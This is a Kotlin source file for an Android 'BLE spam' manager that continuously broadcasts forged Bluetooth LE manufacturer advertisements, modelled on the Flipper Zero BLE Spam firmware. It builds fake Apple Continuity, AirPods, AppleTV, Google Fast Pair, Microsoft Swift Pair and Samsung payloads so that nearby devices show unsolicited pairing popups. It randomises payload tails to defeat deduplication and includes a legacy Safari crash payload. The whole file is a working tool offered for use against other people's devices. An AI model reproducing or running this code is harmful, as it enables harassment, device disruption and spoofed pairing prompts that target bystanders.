package xin.ctkqiang.deauthctrl.manager

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.annotation.StringRes
import androidx.core.content.ContextCompat
import xin.ctkqiang.deauthctrl.L10n
import xin.ctkqiang.deauthctrl.R
import xin.ctkqiang.deauthctrl.model.BleAdvertLogEntry
import xin.ctkqiang.deauthctrl.model.BlePayloadProfile
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.ArrayDeque
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import kotlin.coroutines.resume

/**
 * 一条 BLE 广播帧：company ID 与 payload 分离。
 *
 * 旧实现把 `0x4C,0x00` 等 company ID 前缀写进 payload，又用
 * `addManufacturerData(0xFFFF, …)`，导致接收端只看到"未知厂商 0xFFFF"。
 * 现在由 [BleFrame.companyId] 传给协议栈，payload 只含厂商自定义数据。
 */
data class BleFrame(
    val companyId: Int,
    val payload: ByteArray,
)

/**
 * BLE 广播发射档位。
 *
 * Android 文档给出的档位是**相对值**：HIGH 约 +1 dBm、MEDIUM 约 -7 dBm、
 * LOW 约 -15 dBm，具体受控制器影响，并不是手机的最大发射功率。UI 文案
 * 必须保留这一限定，避免用户误以为"高功率"能显著扩大范围。
 */
enum class BleTxPower(
    @StringRes val labelRes: Int,
    val settingsConstant: Int,
) {
    LOW(R.string.mgr_ble_tx_low, AdvertiseSettings.ADVERTISE_TX_POWER_LOW),
    MEDIUM(R.string.mgr_ble_tx_medium, AdvertiseSettings.ADVERTISE_TX_POWER_MEDIUM),
    HIGH(R.string.mgr_ble_tx_high, AdvertiseSettings.ADVERTISE_TX_POWER_HIGH);
}

/**
 * BLE 广播循环模式
 *
 * - [SEQUENCE]: ALL 模式下依次轮换所有非 ALL Profile，index 递增取模
 * - [RANDOM]:   ALL 模式下每次随机抽一个 Profile，规避过滤趋同
 * - [SINGLE]:   锁定当前 [BleSpamManager.currentProfile]，不参与轮换
 */
enum class BleCycleMode(@StringRes val labelRes: Int) {
    SEQUENCE(R.string.mgr_ble_cycle_sequence),
    RANDOM(R.string.mgr_ble_cycle_random),
    SINGLE(R.string.mgr_ble_cycle_single),
}

/**
 * BLE 广播运行期统计快照。
 *
 * ## 语义纠正
 * 旧实现把 [sent]（onStartSuccess 次数）当成"空口数据包"，并以 20-100ms
 * 重启产生 `pps`。一次 startAdvertising 只是"一个广播会话"，不保证控制器
 * 真的发出了一个空口广播事件；LOW_LATENCY 的实际广播间隔约 100ms，
 * 20-30ms 内 stop/start 可能一个事件都没有。
 *
 * @property sent        成功启动的广播**会话**数（不是空口数据包）
 * @property failed      启动失败的会话数
 * @property total       sent + failed 总尝试数
 * @property successRate 会话启动成功率，0..1，total=0 时为 0
 * @property uptimeMs    本次 start 起累计运行毫秒数，停止后保留最终值
 * @property pps         广播**会话**启动速率（不是空口包速率）
 * @property failRateRecent 最近 [BleSpamManager.RECENT_WINDOW] 次会话的失败率
 * @property sessions    同 [sent]，语义更明确的新字段
 * @property avgDwellMs  平均会话保持时长
 * @property estimatedAirtimeEvents 按 100ms 广播间隔估算的空口事件数（非实测）
 * @property lastFailureCode 最近一次 ADVERTISE_FAILED_* 错误码
 */
data class BleSpamStats(
    val sent: Long,
    val failed: Long,
    val total: Long,
    val successRate: Float,
    val uptimeMs: Long,
    val pps: Float,
    val failRateRecent: Float,
    val sessions: Long = sent,
    val avgDwellMs: Long = 0L,
    val estimatedAirtimeEvents: Long = sent,
    val lastFailureCode: Int? = null,
)

/**
 * BLE 广播会话管理器（伪造厂商广告，非"泛洪压制"）
 *
 * ## 能力边界（UI 与免责声明必须一致）
 * - 公共 API 只能启动**本机** BLE advertising；不能发送任意链路层 PDU，
 *   不能伪造广播 MAC（协议栈使用可解析私有地址 RPA），不能 jam/断开其他设备
 * - 效果仅限：解析对应厂商 payload 的接收端可能显示配对/连续性提示；
 *   是否弹窗取决于接收端系统与版本，不能保证
 * - Android 无公共 API 设置 advertiser MAC，"伪造 N 个不同设备"只停留在
 *   payload 内容层
 *
 * ## 关键修复
 * 1. company ID 与 payload 分离，BYTE 前缀映射到真正的 companyId
 * 2. 每个 profile 的声明长度与实际 body 完全一致，总长 <= 31 字节
 * 3. 每次只保持一个 advertising 会话，等待 onStartSuccess/onStartFailure
 *    后保持 100-300ms 再轮换，避免 code 2（TOO_MANY_ADVERTISERS）
 * 4. code 2 指数退避 250ms → 1s → 2s，连续失败后停止并提示
 * 5. 统计改为"会话/秒"，不再把会话数写成"数据包"
 *
 * ## 线程模型
 * - 主协程 [scope] 调度在 [Dispatchers.Main]，负责生命周期与状态发布
 * - [spamLoop] 实际运行在 [Dispatchers.Default]，避免阻塞 UI 线程
 * - BLE 回调由系统 binder 线程触发，start/stop 全部经 [advLock] 串行化
 *
 * @param context 应用上下文，用于获取 BluetoothManager
 */
class BleSpamManager(private val context: Context) {

    private val bluetoothManager =
        context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val adapter: BluetoothAdapter? = bluetoothManager.adapter
    private var advertiser: BluetoothLeAdvertiser? = null
    private var advertiseJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    /** 进程内共享能力快照：BLE 广播只是"本机广播"，不是压制能力 */
    private val capabilityProbe = CapabilityProbe.get(context)
    val capabilities: StateFlow<DeviceCapabilities> = capabilityProbe.capabilities

    // ─── 公共状态（StateFlow） ───────────────────────────────────────────────

    private val _log = MutableStateFlow<List<BleAdvertLogEntry>>(emptyList())
    val log: StateFlow<List<BleAdvertLogEntry>> = _log.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private val _error = MutableStateFlow<String?>(null)
    val error: StateFlow<String?> = _error.asStateFlow()

    private val _stats = MutableStateFlow(BleSpamStats(0, 0, 0, 0f, 0L, 0f, 0f))
    val stats: StateFlow<BleSpamStats> = _stats.asStateFlow()

    private val _activeProfile = MutableStateFlow(BlePayloadProfile.ALL)
    val activeProfile: StateFlow<BlePayloadProfile> = _activeProfile.asStateFlow()

    // ─── 配置项 ───────────────────────────────────────────────────────────────

    private var currentProfile = BlePayloadProfile.ALL

    /** 广播会话重建间隔（100-300ms），不是空口广播间隔 */
    private var advertiseIntervalMs = INTERVAL_DEFAULT_MS
    private var txPower = BleTxPower.HIGH
    private var cycleMode = BleCycleMode.SEQUENCE
    private var maxPackets: Long = MAX_PACKETS_UNLIMITED
    private var maxAdvertisingDataLength = LEGACY_ADV_MAX_BYTES

    // ─── 原子计数器（跨 binder 线程回调 + Default 线程 spamLoop 安全访问） ─────

    private val packetIndex = AtomicInteger(0)
    private val sentCount = AtomicLong(0)
    private val failedCount = AtomicLong(0)
    private val dwellTotalMs = AtomicLong(0L)
    private val startTimeMs = AtomicLong(0L)
    private val lastFailureCode = AtomicInteger(NO_FAILURE_CODE)
    /** 失败率警告是否已挂出 —— 回落时用于撤下诊断文本 */
    private val highFailRatePosted = AtomicBoolean(false)

    /** 最近 N 次会话成功/失败滑动窗口，用于实时失败率诊断 */
    private val recentResults = ArrayDeque<Boolean>()

    // ─── 当前活跃 advertising 引用（start/stop 全部经 advLock 串行化） ─────────

    @Volatile private var activeAdv: BluetoothLeAdvertiser? = null
    @Volatile private var activeCb: AdvertiseCallback? = null
    private val advLock = Any()

    // ─── 配置 API ──────────────────────────────────────────────────────────────

    fun setProfile(profile: BlePayloadProfile) {
        currentProfile = profile
        _activeProfile.value = profile
    }

    fun getProfile() = currentProfile

    /**
     * 设置广播**会话重建间隔**。
     *
     * 低于 100ms 的重启不会让空口广播更快（LOW_LATENCY 间隔约 100ms），
     * 只会增加 code 2 风险，因此内部钳制到 100-300ms。
     */
    fun setInterval(intervalMs: Long) {
        advertiseIntervalMs = intervalMs.coerceIn(INTERVAL_MIN_MS, INTERVAL_MAX_MS)
    }

    fun getInterval() = advertiseIntervalMs

    fun setTxPower(power: BleTxPower) { txPower = power }

    fun getTxPower() = txPower

    fun setCycleMode(mode: BleCycleMode) { cycleMode = mode }

    fun getCycleMode() = cycleMode

    /**
     * 设置最大会话数。达到该值后自动停止。
     * [MAX_PACKETS_UNLIMITED] 表示不限。
     */
    fun setMaxPackets(max: Long) { maxPackets = max.coerceAtLeast(0) }

    fun getMaxPackets() = maxPackets

    // ─── 生命周期 ──────────────────────────────────────────────────────────────

    /**
     * 启动广播循环。
     *
     * 前置校验：权限 → adapter → 蓝牙开关 → advertiser。任一失败设置 [error]
     * 并直接返回，不会进入"UI 显示运行中但实际没广播"的半启动状态。
     */
    fun start() {
        if (_isRunning.value) return

        val missing = missingPermissions()
        if (missing.isNotEmpty()) {
            _error.value = L10n.get(R.string.mgr_ble_err_permissions, missing.joinToString(" / "))
            return
        }

        val bt = adapter ?: run {
            _error.value = L10n.get(R.string.mgr_ble_err_no_adapter)
            return
        }
        val enabled = runCatching { bt.isEnabled }.getOrElse {
            _error.value = L10n.get(R.string.mgr_ble_err_read_state, it.message ?: it.javaClass.simpleName)
            return
        }
        if (!enabled) {
            _error.value = L10n.get(R.string.mgr_ble_err_bt_off)
            return
        }
        advertiser = runCatching { bt.bluetoothLeAdvertiser }.getOrElse { null }
        if (advertiser == null) {
            _error.value = L10n.get(R.string.mgr_ble_err_no_advertiser)
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            maxAdvertisingDataLength = runCatching {
                bt.leMaximumAdvertisingDataLength
            }.getOrDefault(LEGACY_ADV_MAX_BYTES).coerceAtLeast(LEGACY_ADV_MAX_BYTES)
            if (!runCatching { bt.isMultipleAdvertisementSupported }.getOrDefault(false)) {
                // 不影响单实例连续广播，仅记录：多 set 不可用时本实现仍只用一个会话
                _error.value = null
            }
        }

        capabilityProbe.refreshCheap()

        // 重置本次运行的所有计数器与日志窗口
        _isRunning.value = true
        _error.value = null
        packetIndex.set(0)
        sentCount.set(0L)
        failedCount.set(0L)
        dwellTotalMs.set(0L)
        lastFailureCode.set(NO_FAILURE_CODE)
        startTimeMs.set(System.currentTimeMillis())
        synchronized(recentResults) { recentResults.clear() }
        _stats.value = BleSpamStats(0, 0, 0, 0f, 0L, 0f, 0f)

        // spamLoop 放到 Default，避免 delay 与 payload 构造阻塞 Main
        advertiseJob = scope.launch(Dispatchers.Default) {
            try {
                spamLoop()
            } catch (ce: CancellationException) {
                // 正常取消路径，不视为错误
                throw ce
            } catch (e: Throwable) {
                // 兜底：任何未捕获异常都会让 isRunning 卡 true，这里强制归位
                _isRunning.value = false
                _error.value = "spam loop crashed: ${e.message}"
            }
        }
    }

    /**
     * 停止广播。
     *
     * 顺序：翻转 isRunning 让 spamLoop 自然退出 → cancel job → 停止活跃会话。
     */
    fun stop() {
        _isRunning.value = false
        advertiseJob?.cancel()
        stopActiveAdvertising()
        advertiser = null
        // 停止后冻结 uptime 为最终值（保留展示）
        publishStats(finalize = true)
    }

    fun clearLog() {
        _log.value = emptyList()
        packetIndex.set(0)
        sentCount.set(0L)
        failedCount.set(0L)
        dwellTotalMs.set(0L)
        lastFailureCode.set(NO_FAILURE_CODE)
        synchronized(recentResults) { recentResults.clear() }
        publishStats(finalize = true)
    }

    fun destroy() {
        stop()
        scope.cancel()
    }

    // ─── 主循环 ────────────────────────────────────────────────────────────────

    /**
     * 广播主循环。
     *
     * 每轮：解析 profile → 构造 frame → 启动会话并等待回调 → 保持 100-300ms
     * → 停止并等待槽位回收。每 [STATS_PUBLISH_INTERVAL] 个会话刷新一次统计，
     * 避免每包 StateFlow 抖动。
     */
    private suspend fun spamLoop() {
        var localCycle = 0
        var consecutiveTooMany = 0

        while (_isRunning.value) {
            val profile = resolveNextProfile(localCycle)
            val frame = buildFrame(profile)
            if (frame == null) {
                delay(advertiseIntervalMs)
                localCycle++
                continue
            }
            if (frame.payload.size + 4 > maxAdvertisingDataLength) {
                _error.value = L10n.get(
                    R.string.mgr_ble_err_data_too_large,
                    frame.payload.size + 4,
                    maxAdvertisingDataLength,
                    L10n.get(profile.displayNameRes),
                )
                delay(advertiseIntervalMs)
                localCycle++
                continue
            }

            when (val outcome = advertiseAwait(profile, frame)) {
                is AdvOutcome.Success -> {
                    consecutiveTooMany = 0
                    sentCount.incrementAndGet()
                    dwellTotalMs.addAndGet(advertiseIntervalMs + SESSION_SETTLE_MS)
                    pushRecentResult(success = true)
                    publishStats(finalize = false)
                    // 保持会话 100-300ms：低于 100ms 不会有空口广播事件
                    delay(advertiseIntervalMs)
                    stopAdvertisingAndSettle()
                }

                is AdvOutcome.Failure -> {
                    failedCount.incrementAndGet()
                    lastFailureCode.set(outcome.code)
                    pushRecentResult(success = false)
                    _error.value = advertiseFailureMessage(outcome.code)

                    if (outcome.code == AdvertiseCallback.ADVERTISE_FAILED_TOO_MANY_ADVERTISERS) {
                        consecutiveTooMany++
                        if (consecutiveTooMany >= MAX_TOO_MANY_RETRIES) {
                            _error.value = L10n.get(R.string.mgr_ble_err_slots_exhausted, consecutiveTooMany)
                            stop()
                            return
                        }
                        delay(tooManyBackoffMs(consecutiveTooMany))
                    } else {
                        consecutiveTooMany = 0
                        delay(advertiseIntervalMs)
                    }
                    stopAdvertisingAndSettle()
                }
            }

            localCycle++

            // 周期性发布统计，减少 StateFlow 更新频率
            if (localCycle % STATS_PUBLISH_INTERVAL == 0) publishStats(finalize = false)

            // 滑动窗口失败率诊断
            if (localCycle % RECENT_WINDOW == 0) {
                val recentFailRate = computeRecentFailRate()
                if (recentFailRate > FAIL_RATE_WARN_THRESHOLD) {
                    highFailRatePosted.set(true)
                    _error.value = L10n.get(R.string.mgr_ble_high_fail_rate, (recentFailRate * 100).toInt(), RECENT_WINDOW)
                } else if (highFailRatePosted.getAndSet(false)) {
                    // 失败率回落,撤下诊断文本 —— 布尔标志替代字符串前缀比较,与显示语言解耦
                    _error.value = null
                }
            }

            // 达到最大会话数自动停止
            val total = sentCount.get() + failedCount.get()
            if (maxPackets != MAX_PACKETS_UNLIMITED && total >= maxPackets) {
                stop()
                return
            }
        }
    }

    /**
     * 根据当前 [cycleMode] 与 [currentProfile] 决定本轮发送的 profile。
     */
    private fun resolveNextProfile(cycle: Int): BlePayloadProfile {
        if (currentProfile != BlePayloadProfile.ALL) return currentProfile
        val profiles = BlePayloadProfile.entries.filter { it != BlePayloadProfile.ALL }
        return when (cycleMode) {
            BleCycleMode.SEQUENCE -> profiles[packetIndex.get() % profiles.size]
            BleCycleMode.RANDOM -> profiles.random()
            BleCycleMode.SINGLE -> profiles.first()
        }
    }

    private sealed class AdvOutcome {
        object Success : AdvOutcome()
        data class Failure(val code: Int) : AdvOutcome()
    }

    /**
     * 启动一次 BLE 广播会话并等待 onStartSuccess / onStartFailure。
     *
     * 等待回调是避免 code 2 的关键；callback 与 stopAdvertising 使用同一实例，
     * 避免"停止一个不存在的 callback"。
     */
    private suspend fun advertiseAwait(
        profile: BlePayloadProfile,
        frame: BleFrame,
    ): AdvOutcome = suspendCancellableCoroutine { cont ->
        val adv = advertiser ?: run {
            if (cont.isActive) cont.resume(AdvOutcome.Failure(ERROR_NOT_AVAILABLE))
            return@suspendCancellableCoroutine
        }

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(txPower.settingsConstant)
            .setConnectable(false)
            .build()

        val advData = AdvertiseData.Builder()
            .addManufacturerData(frame.companyId, frame.payload)
            .setIncludeDeviceName(false)
            .setIncludeTxPowerLevel(false)
            .build()

        val idx = packetIndex.incrementAndGet()
        val cb = object : AdvertiseCallback() {
            override fun onStartSuccess(s: AdvertiseSettings?) {
                appendLog(profile, frame, idx, success = true)
                if (cont.isActive) cont.resume(AdvOutcome.Success)
            }

            override fun onStartFailure(code: Int) {
                appendLog(profile, frame, idx, success = false)
                if (cont.isActive) cont.resume(AdvOutcome.Failure(code))
            }
        }

        synchronized(advLock) {
            activeAdv = adv
            activeCb = cb
        }
        try {
            adv.startAdvertising(settings, advData, cb)
        } catch (_: SecurityException) {
            clearActiveAdvertising()
            if (cont.isActive) cont.resume(AdvOutcome.Failure(ERROR_PERMISSION))
        } catch (_: Throwable) {
            clearActiveAdvertising()
            if (cont.isActive) cont.resume(AdvOutcome.Failure(ERROR_INTERNAL))
        }
        cont.invokeOnCancellation {
            // 取消时不能调用 suspend 函数，用同步清理兜底
            stopActiveAdvertising()
        }
    }

    private suspend fun stopAdvertisingAndSettle() {
        stopActiveAdvertising()
        // 给控制器时间回收 advertising 槽位，避免下一轮立即 code 2
        delay(SESSION_SETTLE_MS)
    }

    private fun clearActiveAdvertising() {
        synchronized(advLock) {
            activeAdv = null
            activeCb = null
        }
    }

    /**
     * 停止当前活跃的 advertising 会话。
     *
     * 抽取为独立函数，因为 [advertiseAwait]、[stop] 与取消回调都需要清理；
     * start/stop 使用同一 callback 实例。
     */
    private fun stopActiveAdvertising() {
        val adv: BluetoothLeAdvertiser?
        val cb: AdvertiseCallback?
        synchronized(advLock) {
            adv = activeAdv
            cb = activeCb
            activeAdv = null
            activeCb = null
        }
        if (adv == null || cb == null) return
        try {
            adv.stopAdvertising(cb)
        } catch (_: SecurityException) {
            // 极少数设备在 stop 时仍要求权限，忽略避免误导 UI
        } catch (_: Throwable) {
            // stopAdvertising 不应抛业务异常，吞掉避免影响下一轮
        }
    }

    private fun tooManyBackoffMs(attempt: Int): Long = when (attempt) {
        1 -> 250L
        2 -> 1_000L
        else -> 2_000L
    }

    private fun advertiseFailureMessage(code: Int): String = when (code) {
        AdvertiseCallback.ADVERTISE_FAILED_DATA_TOO_LARGE -> L10n.get(R.string.mgr_ble_adv_data_too_large)
        AdvertiseCallback.ADVERTISE_FAILED_TOO_MANY_ADVERTISERS ->
            L10n.get(R.string.mgr_ble_adv_too_many)
        AdvertiseCallback.ADVERTISE_FAILED_ALREADY_STARTED -> L10n.get(R.string.mgr_ble_adv_already_started)
        AdvertiseCallback.ADVERTISE_FAILED_INTERNAL_ERROR -> L10n.get(R.string.mgr_ble_adv_internal)
        AdvertiseCallback.ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> L10n.get(R.string.mgr_ble_adv_unsupported)
        ERROR_PERMISSION -> L10n.get(R.string.mgr_ble_adv_no_permission)
        ERROR_NOT_AVAILABLE -> L10n.get(R.string.mgr_ble_adv_unavailable)
        ERROR_INTERNAL -> L10n.get(R.string.mgr_ble_adv_exception)
        else -> L10n.get(R.string.mgr_ble_adv_failed_code, code)
    }

    // ─── Payload 构造 ──────────────────────────────────────────────────────────

    /**
     * 按 profile 构造一帧广播数据。
     *
     * 结构参照 Flipper Zero BLE Spam 公开固件源码，但严格保证：
     * - company ID 由 [BleFrame.companyId] 承载，payload 内不再重复前缀
     * - Apple 载荷的声明长度字节 == 其后实际 body 字节数
     * - 总 AD 长度 payload.size + 4 <= 31（legacy advertising）
     *
     * 随机尾每次调用重建，避免接收端对相同 payload 去重。
     */
    private fun buildFrame(profile: BlePayloadProfile): BleFrame? {
        val frame = when (profile) {
            // Apple Continuity: 类型(05/07/0B/0C/10 轮换) + 长度 + body
            BlePayloadProfile.APPLE_CONTINUITY -> {
                val type = byteArrayOf(0x05, 0x07, 0x0B, 0x0C, 0x10).random()
                val body = byteArrayOf(0x02) + rand(16)
                BleFrame(0x004C, byteArrayOf(type, body.size.toByte()) + body)
            }

            // AirPods 配对弹窗: 0x07 + 0x19(25) + 25 字节 body（长度与 body 一致）
            BlePayloadProfile.AIRPODS ->
                BleFrame(0x004C, byteArrayOf(0x07, 0x19) + rand(25))

            // iOS 锁屏/AppleTV 弹窗: 0x10 + 长度 + "AppleTV" + 随机尾
            BlePayloadProfile.IOS_LOCK_SCREEN -> {
                val body = "AppleTV".toByteArray(Charsets.US_ASCII) + rand(5)
                BleFrame(0x004C, byteArrayOf(0x10, body.size.toByte()) + body)
            }

            // Apple 动作消息: 0x0F + 长度 + 子类型 + 文本
            BlePayloadProfile.APPLE_ACTION -> {
                val body = byteArrayOf(0x01) + "AirPods Pro".toByteArray(Charsets.US_ASCII)
                BleFrame(0x004C, byteArrayOf(0x0F, body.size.toByte()) + body)
            }

            // Safari 历史崩溃包(现代 iOS 已修复,仅协议研究): 0x12 + 长度(22) + body
            BlePayloadProfile.CRASH_SAFARI -> {
                val body = ByteArray(22) { 'a'.code.toByte() }
                BleFrame(0x004C, byteArrayOf(0x12, body.size.toByte()) + body)
            }

            // Android 设备伪装: Fast Pair 变体,随机 model id
            BlePayloadProfile.ANDROID_DEVICE ->
                BleFrame(0x00E0, byteArrayOf(0x01, 0x00) + rand(3) + byteArrayOf(0x10) + rand(6))

            BlePayloadProfile.MICROSOFT_SWIFT_PAIR ->
                BleFrame(0x0006, byteArrayOf(0x00, 0x01, 0x03) + rand(12))

            BlePayloadProfile.GOOGLE_FAST_PAIR ->
                BleFrame(0x00E0, byteArrayOf(0x00, 0x02, 0x71, 0x8C.toByte(), 0x10) + rand(8))

            BlePayloadProfile.SAMSUNG_SMARTTHINGS ->
                BleFrame(0x0075, byteArrayOf(0x00, byteArrayOf(0x01, 0x02, 0x03).random(), 0x00) + rand(12))

            // 通用随机压力: 测试厂商 ID 0xFFFF 下的随机载荷
            BlePayloadProfile.GENERIC_RANDOM -> BleFrame(0xFFFF, rand(24))

            BlePayloadProfile.FLIPPER_STYLE -> return buildFrame(
                BlePayloadProfile.entries.filter {
                    it != BlePayloadProfile.ALL && it != BlePayloadProfile.FLIPPER_STYLE
                }.random(),
            )

            BlePayloadProfile.ALL -> return buildFrame(
                BlePayloadProfile.entries.filter {
                    it != BlePayloadProfile.ALL && it != BlePayloadProfile.FLIPPER_STYLE
                }.random(),
            )
        }
        return frame.takeIf { it.payload.size + 4 <= LEGACY_ADV_MAX_BYTES }
    }

    // ─── 日志与统计 ────────────────────────────────────────────────────────────

    private fun appendLog(
        profile: BlePayloadProfile,
        frame: BleFrame,
        index: Int,
        success: Boolean,
    ) {
        val e = BleAdvertLogEntry(
            profile = profile,
            payloadHex = frame.payload.toHexString(),
            payloadBytes = frame.payload,
            success = success,
            index = index,
            txPowerLevel = txPower.name,
        )
        val current = _log.value
        val newList = if (current.size >= LOG_LIMIT) {
            // 满 200 后，采用 ArrayDeque 滚动避免每次重新分配 200 元素
            val dq = ArrayDeque(current)
            dq.removeFirst()
            dq.addLast(e)
            dq.toList()
        } else {
            current + e
        }
        _log.value = newList
    }

    /**
     * 推入一个最近会话结果到滑动窗口。
     * 窗口满 [RECENT_WINDOW] 时移除最旧的一条。
     */
    private fun pushRecentResult(success: Boolean) {
        synchronized(recentResults) {
            if (recentResults.size >= RECENT_WINDOW) recentResults.removeFirst()
            recentResults.addLast(success)
        }
    }

    private fun computeRecentFailRate(): Float {
        val snapshot = synchronized(recentResults) { recentResults.toList() }
        if (snapshot.isEmpty()) return 0f
        val fails = snapshot.count { !it }
        return fails.toFloat() / snapshot.size
    }

    /**
     * 计算并发布当前统计快照。
     *
     * @param finalize 是否为停止时的最终快照。true 时不再更新 uptime。
     */
    private fun publishStats(finalize: Boolean) {
        val sent = sentCount.get()
        val failed = failedCount.get()
        val total = sent + failed
        val successRate = if (total == 0L) 0f else sent.toFloat() / total
        val startedAt = startTimeMs.get()
        val measured = if (startedAt <= 0L) 0L else maxOf(0L, System.currentTimeMillis() - startedAt)
        val uptime = if (finalize) {
            // 停止后保留最后一次运行的时长快照，至少不因未发布而归零
            maxOf(_stats.value.uptimeMs, measured)
        } else {
            measured
        }
        val dwell = dwellTotalMs.get()
        val pps = if (uptime <= 0L) 0f else sent * 1000f / uptime
        _stats.value = BleSpamStats(
            sent = sent,
            failed = failed,
            total = total,
            successRate = successRate,
            uptimeMs = uptime,
            pps = pps,
            failRateRecent = computeRecentFailRate(),
            sessions = sent,
            avgDwellMs = if (sent > 0L) dwell / sent else 0L,
            estimatedAirtimeEvents = minOf(sent, dwell / AIRTIME_INTERVAL_MS),
            lastFailureCode = lastFailureCode.get().takeIf { it != NO_FAILURE_CODE },
        )
    }

    // ─── 工具 ──────────────────────────────────────────────────────────────────

    private fun missingPermissions(): List<String> {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return emptyList()
        return listOf(
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.BLUETOOTH_ADVERTISE,
        ).filter {
            ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
        }
    }

    private fun rand(c: Int) = ByteArray(c).also { kotlin.random.Random.nextBytes(it) }
    private fun ByteArray.toHexString() = joinToString("") { "%02X".format(it) }

    private companion object {
        /** 会话重建间隔下限：LOW_LATENCY 空口间隔约 100ms，低于它没有意义 */
        const val INTERVAL_MIN_MS = 100L

        /** 会话重建间隔上限 */
        const val INTERVAL_MAX_MS = 300L

        /** 默认会话重建间隔 */
        const val INTERVAL_DEFAULT_MS = 200L

        /** start/stop 之间的槽位回收等待 */
        const val SESSION_SETTLE_MS = 120L

        /** AOSP LOW_LATENCY 广播间隔约 100ms，用于估算空口事件 */
        const val AIRTIME_INTERVAL_MS = 100L

        /** Legacy advertising 上限：company ID(2) + length/type 头(2) + payload */
        const val LEGACY_ADV_MAX_BYTES = 31

        /** 环形日志缓冲上限 */
        const val LOG_LIMIT = 200

        /** 滑动窗口大小，用于实时失败率诊断 */
        const val RECENT_WINDOW = 100

        /** 统计快照发布周期（每 N 个会话发布一次，降低 StateFlow 更新频率） */
        const val STATS_PUBLISH_INTERVAL = 25

        /** 滑动窗口失败率告警阈值 */
        const val FAIL_RATE_WARN_THRESHOLD = 0.5f

        /** 不限最大会话数 */
        const val MAX_PACKETS_UNLIMITED = -1L

        /** code 2 连续失败上限：超过后停止并提示重启蓝牙 */
        const val MAX_TOO_MANY_RETRIES = 6

        const val NO_FAILURE_CODE = Int.MIN_VALUE
        const val ERROR_PERMISSION = -2
        const val ERROR_INTERNAL = -3
        const val ERROR_NOT_AVAILABLE = -4
    }
}
